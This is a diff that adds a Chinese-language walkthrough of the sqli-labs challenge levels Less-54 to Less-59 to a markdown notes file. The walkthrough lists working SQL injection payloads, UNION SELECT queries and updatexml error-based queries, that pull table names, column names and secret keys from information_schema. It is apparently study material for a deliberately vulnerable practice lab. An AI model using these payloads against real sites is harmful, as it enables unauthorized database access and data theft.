@@ -1225,3 +1225,68 @@ ERROR 1105 (HY000): XPATH syntax error: '~information_schema,c~'
 
 可以使用`if`,`updatexml`进行注入
 
+## Challenges
+
+### Less-54
+
+在10次测试中获取到密钥
+
+1. 判断闭合方式,得到闭合方式为`'`,同时没有报错信息
+
+2. 判断列数,一共有3列`?id=1' order by 3--%20`
+
+3. `?id=-1' union select 1,2,3--%20`只有`2,3`列正常回显
+
+4. `?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--%20`获取表名
+
+5. `?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='GFTILUL21Y')--%20`获取列名
+
+6. `?id=-1' union select 1,(select group_concat(id) from GFTILUL21Y),(select group_concat(sessid) from GFTILUL21Y)--%20`获取`id`和`sessid`
+
+7. `?id=-1' union select 1,(select group_concat(secret_ZHH9) from GFTILUL21Y),(select group_concat(tryy) from GFTILUL21Y)--%20`获取`secret_ZHH9`和`tryy`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111051519257.png)
+
+### Less-55
+
+在14次测试中获取到密钥
+
+1. 判断闭合方式,得到闭合方式为`)`,同时没有报错信息
+
+2. 其余方式同上
+
+### Less-56
+
+在14次测试中获取到密钥
+
+1. 判断闭合方式,得到闭合方式为`')`,同时没有报错信息
+
+2. 其余方式同上
+
+### Less-57
+
+在14次测试中获取到密钥
+
+1. 判断闭合方式,得到闭合方式为`"`,同时没有报错信息
+
+2. 其余方式同上
+
+### Less-58
+
+在5次测试中获取到密钥
+
+1. 判断闭合方式,得到闭合方式为`'`,传入`1'`返回`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`
+
+2. 传入`?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,20) from information_schema.tables where table_schema=database()),0x7e),1)--%20`返回表名
+
+3. 传入`?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,30) from information_schema.columns where table_name='DIJZ7NA09S'),0x7e),1)--%20`返回列名
+
+4. 传入`?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(secret_6WHE),1,30) from DIJZ7NA09S),0x7e),1)--%20`得到密钥
+
+### Less-59
+
+在5次测试中获取到密钥
+
+1. 判断闭合方式,得知不需要进行闭合,传入`1'`返回`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1`
+
+2. 其余同上
